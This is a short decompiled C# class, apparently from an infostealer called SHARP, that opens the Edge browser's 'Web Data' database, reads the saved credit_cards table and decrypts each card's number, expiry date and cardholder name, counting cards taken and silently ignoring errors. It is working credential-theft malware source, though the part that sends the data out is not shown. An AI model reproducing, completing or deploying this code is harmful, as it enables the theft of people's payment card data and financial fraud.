﻿using System;
using System.Collections.Generic;
using SHARP.Chromium;

namespace SHARP.Edge
{
	// Token: 0x02000078 RID: 120
	internal sealed class CreditCards
	{
		// Token: 0x0600028C RID: 652 RVA: 0x0000FC88 File Offset: 0x0000DE88
		public static List<CreditCard> Get(string sWebData)
		{
			List<CreditCard> list = new List<CreditCard>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(sWebData, "credit_cards");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					CreditCard item = default(CreditCard);
					item.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4)));
					item.sExpYear = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 3)));
					item.sExpMonth = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 2)));
					item.sName = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 1)));
					Counting.CreditCards++;
					list.Add(item);
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
